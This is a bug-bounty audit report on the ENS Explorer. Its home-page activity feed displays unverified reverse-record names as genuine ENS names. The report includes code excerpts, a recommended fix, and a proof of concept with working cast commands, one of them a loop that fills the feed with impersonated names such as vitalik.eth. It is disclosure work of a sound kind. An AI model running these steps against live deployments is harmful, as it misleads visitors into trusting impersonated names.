# 92553 w a insight explorer home page recent activity shows unverified reverse record names as genuine ens names persistent content injection&#x20;

**Submitted on Sep 10th 2026 at 16:19:00 UTC by @enowk for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92553
* **Report Type:** Websites & Apps
* **Report severity:** Insight
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Injecting/modifying the static content on the target application without JavaScript (persistent), such as:
* HTML injection without JavaScript
* Replacing existing text with arbitrary text
* Arbitrary file uploads, etc.

## Description

## Brief/Intro

The Explorer's home page shows every visitor a "Recent Activity" feed of the latest ENS events. For primary-name updates (`NameChanged` events), the feed takes the name string from the event and displays it as a genuine ENS name, with the same name badge and `/<name>` link that a real name gets, without checking that the name belongs to the address that set it. Any address can set its own reverse record to any string in one unprivileged transaction, so an attacker who owns nothing can make the home page show "vitalik.eth — Primary name updated", and with 15 transactions can replace every row in the feed. Elsewhere, the Explorer forward-verifies a reverse name before presenting it as a primary name (ENSIP-3 / ENSIP-19); this feed does not.

## Vulnerability Details

### Background

An address's reverse record is a name string the address writes for itself by calling `setName(string)` on the reverse registrar. The call accepts any string. It does not check that the caller owns the name, or that the name points back to the caller. A reverse record on its own is therefore only a claim. It becomes a primary name only after a forward check confirms that the name resolves back to the same address (ENSIP-3; ENSIP-19 for the multichain version).

When `setName` is called, the default public resolver emits `NameChanged(bytes32 node, string name)`. Here `node` is the caller's reverse node (`<address>.addr.reverse`) and `name` is the caller-supplied string.

### Root cause

**1. The feed query is unfiltered.** The feed requests the 15 most recent events from the indexer with no filter and no ordering argument, then drops `CommitmentMade` events and sorts by timestamp ([`useRecentActivity.ts` L25-L51](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/dashboard/hooks/useRecentActivity.ts#L25-L51)).

**2. The formatter passes the event's string through as a name.** The `NameChanged` descriptor maps the event's `data.name` field to a name entity, and the value is copied without any check ([`formatActivityEvent.ts` L70-L75](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/dashboard/utils/formatActivityEvent.ts#L70-L75), [L132-L140](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/dashboard/utils/formatActivityEvent.ts#L132-L140)):

```ts
  // Name / reverse resolution — name lives inside data.name
  NameChanged: {
    text: 'Primary name updated',
    entityField: 'name',
    entityType: 'name',
  },
```

```ts
  if (descriptor.entityField) {
    const entityValue = parsedData[descriptor.entityField]
    if (entityValue) {
      result.entityFromData = {
        type: descriptor.entityType ?? 'name',
        value: entityValue,
      }
    }
  }
```

**3. The table falls back to that value.** A reverse node is not a registered name, so the indexer returns `name: null` and `domain: null` for these events. The table then uses the fallback value and renders it with the name badge ([`RecentActivityTable.tsx` L34-L44](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/dashboard/components/RecentActivityTable.tsx#L34-L44), [L58-L63](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/dashboard/components/RecentActivityTable.tsx#L58-L63)):

```ts
          const rawName =
            event.name?.trim() || event.domain?.name?.trim() || null
          const resolvedName =
            rawName &&
            !rawName.startsWith('tokenId:') &&
            !rawName.startsWith('canonicalId:')
              ? rawName
              : null
          const nameEntity = resolvedName
            ? { type: 'name' as const, value: resolvedName }
            : entityFromData
```

```tsx
                  {match(nameEntity)
                    .with({ type: 'name' }, ({ value }) => (
                      <EntityBadge variant="name" name={value}>
                        {truncateName(value)}
                      </EntityBadge>
                    ))
```

**4. The badge links to the genuine name's page.** For `variant="name"`, `EntityBadge` wraps the value in a link to `/$name` on the Explorer's own origin ([`EntityBadge.tsx` L258-L263](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/components/EntityBadge.tsx#L258-L263)). This is the same component, styling and link used for every legitimately indexed name in the table. Nothing marks the value as unverified. Values of up to 24 characters are shown in full ([`truncateName.ts` L15-L16](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/utils/formatting/truncateName.ts#L15-L16)).

**5. It is on the home page.** The table is mounted unconditionally on the root route `/`, under the heading "Explore the source of truth for Ethereum Name Service" ([`routes/index.tsx` L26-L28](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/routes/index.tsx#L26-L28), [L53](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/routes/index.tsx#L53)).

### The Explorer applies the forward check elsewhere

`usePrimaryName` accepts a reverse name only when the forward check passes ([`usePrimaryName.ts` L36-L43](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/profile/hooks/usePrimaryName.ts#L36-L43)):

```ts
  // Step 1: L1 default reverse (coin 60). ensjs `getName` calls
  // `UniversalResolver.reverse(addr, 60n)` and returns `{ name, match }`
  // where `match` is the ENSIP-3 forward-verified check.
  const defaultResult = yield* await fromPromise(
    getName(client, { address }),
    (e) => new PrimaryNameError({ cause: e }),
  )
  if (defaultResult?.match) return ok(defaultResult.name)
```

The Explorer's reverse-resolution views use the same check (`useReverseMatch.ts`, `computeDisplayNameState.ts`). For the account in the proof of concept the check fails, because `vitalik.eth` resolves to `0xd8dA…6045`, not to that account. By the Explorer's own definition the account has no primary name, yet the home-page feed reports "vitalik.eth — Primary name updated".

### Relationship to known issue EXP-INPUT-005

EXP-INPUT-005 covers name validators that accept homoglyphs, control characters or a stray leading or trailing dot, "causing homograph-style display confusion in the UI". That issue is about a string that looks like a different name, and its fix is stricter character validation.

This report has a different cause and a different fix. The string shown here is the genuine, correctly spelled, already-normalized name `vitalik.eth`, so no character validation or normalization would catch it. The missing control is the forward check described above. Fixing EXP-INPUT-005 completely would leave this issue fully exploitable.

## Impact Details

* **Who can do it:** any address. It needs no ownership of the displayed name, no role, and no action from any victim.
* **Cost:** one transaction per row. Measured on a Sepolia fork: 113,889 gas for an account's first write (which also creates its reverse record) and about 55,200 gas for each later write. The 15 transactions that replaced the whole feed used 828,288 gas in total, about 0.008 ETH at 10 gwei.
* **Effect:** the home page shown to every visitor states that well-known names such as `vitalik.eth`, `ens.eth` or `coinbase.eth` updated their primary name. These rows use the same badge and the same kind of link as genuine activity. With 15 transactions, one account replaced every genuine row in the feed (PoC Step 6).
* **Stored, not reflected:** the text is stored on-chain and in the indexer's database, and is served to visitors without any input from them.

**Selected impact (High):**

> Injecting/modifying the static content on the target application without JavaScript (persistent), such as:
>
> * HTML injection without JavaScript
> * Replacing existing text with arbitrary text
> * Arbitrary file uploads, etc.

The injected content is stored (persistent). React renders it as plain text, so no JavaScript is involved. It appears on the Explorer's home page (the target application). As PoC Step 6 shows, it replaces the feed's existing text with attacker-chosen text. The program's out-of-scope list excludes reflected plain-text injection, and states that this "does not exclude … persistent plain text injection".

The Critical impact for displaying an incorrect name "so that a user sends funds or submits a transaction to an unintended recipient" is not claimed, because the feed has no transaction flow.

### Limitations

* A row stays visible until 15 newer events arrive. On the live Sepolia indexer, the 15-row window spanned 2.4 minutes and 6.4 minutes in two measurements. Sending the transaction again puts the row back at the top.
* The app passes no ordering argument. In testing, both the local and the live indexer returned events newest first.
* The badge links to the genuine name's page, not to attacker-controlled content. No avatar is shown on this surface.
* Values longer than 24 characters are shortened by `truncateName`, so the most convincing payloads are real names of ordinary length.

## Recommended fix

Show `data.name` from a `NameChanged` event as a name badge only if it passes the forward check that `usePrimaryName` already performs. Otherwise, show it as plain, unlinked text, or not at all. The smallest safe change is to remove `entityField: 'name'` from the `NameChanged` descriptor. Reverse-record events would then fall through to the table's existing transaction-link display.

## References

All links point to the audited commit `1c9b47f`.

* [`apps/portal/src/features/dashboard/hooks/useRecentActivity.ts` L25-L51](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/dashboard/hooks/useRecentActivity.ts#L25-L51): unfiltered `events(first: 15)` query
* [`apps/portal/src/features/dashboard/utils/formatActivityEvent.ts` L70-L75](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/dashboard/utils/formatActivityEvent.ts#L70-L75) and [L132-L140](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/dashboard/utils/formatActivityEvent.ts#L132-L140): `NameChanged` descriptor and unchecked `data.name`
* [`apps/portal/src/features/dashboard/components/RecentActivityTable.tsx` L34-L44](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/dashboard/components/RecentActivityTable.tsx#L34-L44) and [L58-L63](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/dashboard/components/RecentActivityTable.tsx#L58-L63): fallback to the unchecked value and name-badge rendering
* [`apps/portal/src/components/EntityBadge.tsx` L258-L263](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/components/EntityBadge.tsx#L258-L263): `variant="name"` link to `/$name`
* [`apps/portal/src/utils/formatting/truncateName.ts` L15-L16](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/utils/formatting/truncateName.ts#L15-L16): 24-character display limit
* [`apps/portal/src/routes/index.tsx` L26-L28](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/routes/index.tsx#L26-L28) and [L53](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/routes/index.tsx#L53): home-page heading and table
* [`apps/portal/src/features/profile/hooks/usePrimaryName.ts` L36-L43](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/profile/hooks/usePrimaryName.ts#L36-L43): the Explorer's forward-checked primary-name lookup
* ENSIP-3 (reverse resolution) and ENSIP-19 (multichain primary names): a reverse name must be forward-verified before it is treated as a primary name

## Proof of Concept

## Proof of Concept

A newly created account that owns nothing writes `vitalik.eth` into its own reverse record. The Explorer home page then shows "vitalik.eth — Primary name updated" at the top of Recent Activity, in the same badge as genuine activity. Fifteen more transactions from the same account replace every row in the feed. All steps use one account on a local fork of Sepolia; no transactions were sent to a public network.

### Environment

* The repository at the audited commit, using its own local stack in `e2e/infra`: Anvil forking Sepolia (fork head block 11675803), the ENS indexer and its GraphQL API on port 5655, and the Explorer (`apps/portal`) development server pointed at that API.
* Indexer config: the JSON in the Appendix, saved as `e2e/infra/panoptes/contracts.poc.json`. The committed `e2e/infra/panoptes/contracts.json` points at an older Sepolia ENSv2 deployment and starts several contracts at block 0. The Appendix version uses the current deployment addresses and starts at block 11530140. Only contract addresses and start blocks differ; the reverse registrar address is the same in both files.
* Screenshots were taken from the local development build in Chromium (1280×900), with no wallet connected.

```bash
# first save the Appendix JSON as e2e/infra/panoptes/contracts.poc.json
cd e2e/infra
docker compose up -d anvil
PANOPTES_CONTRACTS_FILE=./panoptes/contracts.poc.json docker compose up -d panoptes-indexer panoptes-api
# wait until the indexer log reports "synced v2 to block <fork head>", then:
cd ../..
echo 'VITE_INDEXER_GRAPHQL_URL=http://127.0.0.1:5655/graphql' > apps/portal/.env.local
pnpm --filter portal dev    # Explorer on http://localhost:3001/
```

All `cast` commands below use `--rpc-url http://127.0.0.1:8545`.

Before the attack, the feed contains only real Sepolia activity from other accounts. Rows returned by the Explorer's query, after the app's own processing:

```
row 1   NameRenewed      jaquelinehydepaulklee.eth
row 2   AddressChanged   electrosurgeries.eth
row 3   AddressChanged   electrosurgeries.eth
row 4   NameRegistered   electrosurgeries.eth
...
row 14  TextChanged      btc-sal-01.salviega.eth
```

### Step 1: Create an attacker account that owns nothing

```bash
cast wallet new
# Address: 0x67BFf7D006158f709059b45625DFe3521197F8cB
cast rpc anvil_setBalance 0x67BFf7D006158f709059b45625DFe3521197F8cB 0xDE0B6B3A7640000   # 1 ETH for gas
cast code  0x67BFf7D006158f709059b45625DFe3521197F8cB    # 0x  (plain account, no contract code)
cast nonce 0x67BFf7D006158f709059b45625DFe3521197F8cB    # 0
```

`vitalik.eth` belongs to another party (its registry owner is the NameWrapper) and does not resolve to the attacker:

```bash
cast call 0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e "owner(bytes32)(address)" $(cast namehash vitalik.eth)
# 0x0635513f179D50A207757E05759CbD106d7dFcE8   (NameWrapper)
cast resolve-name vitalik.eth
# 0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045
```

### Step 2: Write the claim (one unprivileged transaction)

```bash
cast send 0xA0a1AbcDAe1a2a4A2EF8e9113Ff0e02DD81DC0C6 \
  $(cast calldata "setName(string)" "vitalik.eth") \
  --private-key <attacker key>
# status 1, block 11675804, gasUsed 113889
# tx 0x57700644286c7947bcbad40f6a699ebb8656e61f3978b240c775c8d1ed7d36a4
```

`0xA0a1…C0C6` is the Sepolia reverse registrar. Pass the ABI-encoded calldata as shown. With the form `cast send <addr> "setName(string)" "vitalik.eth"`, cast resolves the name-like argument to an address before sending, and the address string is stored instead.

The transaction receipt contains four events. `NameChanged` is emitted by the public resolver, not by the reverse registrar:

```
0xA0a1AbcDAe1a2a4A2EF8e9113Ff0e02DD81DC0C6   reverse registrar   ReverseClaimed(address,bytes32)
0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e   ENS registry        NewOwner(bytes32,bytes32,address)
0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e   ENS registry        NewResolver(bytes32,address)
0xE99638b40E4Fff0129D56f03b55b6bbC4BBE49b5   public resolver     NameChanged(bytes32,string)
```

### Step 3: The claim fails the standard forward check

```bash
cast lookup-address 0x67BFf7D006158f709059b45625DFe3521197F8cB --verify
# Error: Reverse lookup verification failed: got `0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045`,
#        expected `0x67BFf7D006158f709059b45625DFe3521197F8cB`
```

The Explorer's `usePrimaryName` applies the same check, so by the Explorer's own definition this account has no primary name.

### Step 4: The indexer stores the string unchanged

The attacker's event in the indexer's response to the Explorer's exact query, `events(first: 15)`:

```json
{
  "name": null,
  "type": "NameChanged",
  "transactionHash": "0x57700644286c7947bcbad40f6a699ebb8656e61f3978b240c775c8d1ed7d36a4",
  "timestamp": 1789055184,
  "blockNumber": 11675804,
  "contractAddress": "0xe99638b40e4fff0129d56f03b55b6bbc4bbe49b5",
  "namehash": "0xe1e032582ab50387ba18971d81af5d9d9fbd728fb4dbd36777a81fe85363ae4f",
  "domain": null,
  "data": "{\"namehash\":\"0xe1e032582ab50387ba18971d81af5d9d9fbd728fb4dbd36777a81fe85363ae4f\",\"resolver\":\"0xe99638b40e4fff0129d56f03b55b6bbc4bbe49b5\",\"name\":\"vitalik.eth\"}"
}
```

`namehash` is the attacker's reverse node, `namehash("67bff7d006158f709059b45625dfe3521197f8cb.addr.reverse")`. After the app's own processing (drop `CommitmentMade`, sort by timestamp), the rows are:

```
row 1   NameChanged      vitalik.eth                 <- attacker
row 2   NameRenewed      jaquelinehydepaulklee.eth
row 3   AddressChanged   electrosurgeries.eth
row 4   AddressChanged   electrosurgeries.eth
row 5   NameRegistered   electrosurgeries.eth
...
row 14  TextChanged      btc-sal-01.salviega.eth
```

Rows 2–14 are the same real Sepolia events as before the attack.

### Step 5: The Explorer home page

Open the Explorer's home page. The attached `2-single-closeup.png` shows the top of the feed; `2-single-fullpage.png` shows the whole page:

```
2m ago    [ vitalik.eth ]                Primary name updated    <- attacker
24m ago   [ jaquelineh…epaulklee.eth ]   Name renewed
25m ago   [ electrosurgeries.eth ]       ETH address updated
25m ago   [ electrosurgeries.eth ]       ETH address updated
```

The attacker's row uses the same name badge as the genuine rows beneath it. The link targets read from the rendered page have the same form:

```
row 1   href=/vitalik.eth                  <- attacker
row 2   href=/jaquelinehydepaulklee.eth
row 3   href=/electrosurgeries.eth
```

### Step 6: One account replaces the whole feed

```bash
for n in nick.eth ens.eth brantly.eth coinbase.eth uniswap.eth opensea.eth arbitrum.eth \
         base.eth optimism.eth ethereum.eth metamask.eth ledger.eth aave.eth 1inch.eth vitalik.eth; do
  cast send 0xA0a1AbcDAe1a2a4A2EF8e9113Ff0e02DD81DC0C6 $(cast calldata "setName(string)" "$n") \
    --private-key <attacker key>
done
# 15 transactions, all status 1, blocks 11675805-11675819
# 55,180-55,240 gas each, 828,288 gas in total
```

The feed no longer shows any genuine activity (attached `4-takeover-feed.png`):

```
40s ago   [ vitalik.eth ]    Primary name updated
41s ago   [ 1inch.eth ]      Primary name updated
41s ago   [ aave.eth ]       Primary name updated
41s ago   [ ledger.eth ]     Primary name updated
41s ago   [ metamask.eth ]   Primary name updated
42s ago   [ ethereum.eth ]   Primary name updated
43s ago   [ optimism.eth ]   Primary name updated
43s ago   [ base.eth ]       Primary name updated
43s ago   [ arbitrum.eth ]   Primary name updated
44s ago   [ opensea.eth ]    Primary name updated
44s ago   [ uniswap.eth ]    Primary name updated
45s ago   [ coinbase.eth ]   Primary name updated
46s ago   [ brantly.eth ]    Primary name updated
47s ago   [ ens.eth ]        Primary name updated
48s ago   [ nick.eth ]       Primary name updated
```

All 15 rows come from the attacker's account, and each links to the genuine name's page (`/vitalik.eth`, `/1inch.eth`, …).

### Step 7: The same data on the live indexer

The Explorer's default indexer is `https://staging-graphql.ens.dev/` (`packages/indexer/urql/client.ts`). A read-only query shows that real `NameChanged` events already take the unchecked fallback path:

```graphql
{ events(first: 12, where: { type: "NameChanged" }) { name domain { name } data } }
```

Excerpt of the response on 2026-09-10:

```
name=null   domain=null   data.name="pocpr1a01fa9d5e7.eth"
name=null   domain=null   data.name="jobintime.xyz"
name=null   domain=null   data.name="chakri.eth"
name=null   domain=null   data.name="bosko-test-2.com"
```

This step only reads public data from the endpoint the Explorer uses by default; the home page itself sends the same kind of request every 30 seconds. No transactions were sent to Sepolia or to any other public network.

### Attachments

* `2-single-closeup.png`: the attacker's row above genuine activity (main image, Step 5)
* `4-takeover-feed.png`: the feed after Step 6, with all 15 rows from the attacker
* `2-single-fullpage.png`: the whole home page after Step 2, for context

All other outputs (transactions, receipts, indexer responses, link targets) are reproduced as text in the steps above.

### Appendix: indexer config (`e2e/infra/panoptes/contracts.poc.json`)

```json
{
  "_comment": "Local indexer config: current @ensdomains/ensjs Sepolia ENSv2 deployment, start block 11530140.",
  "temporary_registrar": "0x0000000000000000000000000000000000000000",
  "old_ens_registry": "0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e",
  "old_public_resolver": "0x0000000000000000000000000000000000000000",
  "ens_registry": "0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e",
  "base_registrar": "0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85",
  "eth_registrar_controller": "0xfb3cE5D01e0f33f41DbB39035dB9745962F1f968",
  "public_resolver": "0x5239A812ec9A62F46dbb5de8f346C8eFe7553A9f",
  "reverse_registrar": "0xA0a1AbcDAe1a2a4A2EF8e9113Ff0e02DD81DC0C6",
  "name_wrapper": "0x0635513f179D50A207757E05759CbD106d7dFcE8",
  "root_registry": "0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2",
  "eth_registry": "0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2",
  "registry_datastore": "0x5a9236e72a66d3e08b83dcf489b4d850792b6009",
  "eth_reverse_registrar": "0xA0a1AbcDAe1a2a4A2EF8e9113Ff0e02DD81DC0C6",
  "l2_eth_registry": "0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2",
  "l2_eth_registrar": "0xa88553F454b77203B0D036A05c894d555EAAa2Cc",
  "l2_registry_datastore": "0x5a9236e72a66d3e08b83dcf489b4d850792b6009",
  "migration_helper": "0x1D8c7aA9862F9b823309Ad87A4864Fb27C575e85",
  "locked_migration_controller": "0x5c39E36a69A9897F08954c71aCB1F36E0Bd4f409",
  "unlocked_migration_controller": "0x2FCf83232b93bD29C59dB18AaA1D4b62e9f9FC73",
  "v1_deployment_block": 11530140,
  "l1_deployment_block": 11530140,
  "l2_deployment_block": 11530140,
  "temp_registrar_start_block": 11530140,
  "v1_migration_block": 11530140,
  "name_wrapper_deployment_block": 11530140
}
```
